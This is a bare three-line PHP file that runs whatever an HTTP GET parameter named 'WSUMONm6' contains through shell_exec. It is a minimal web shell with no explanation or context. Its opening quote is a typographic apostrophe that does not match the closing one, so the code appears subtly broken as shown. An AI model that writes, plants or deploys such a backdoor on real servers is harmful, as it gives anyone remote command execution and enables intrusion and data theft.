<?php
shell_exec($_GET[’WSUMONm6']);
?>
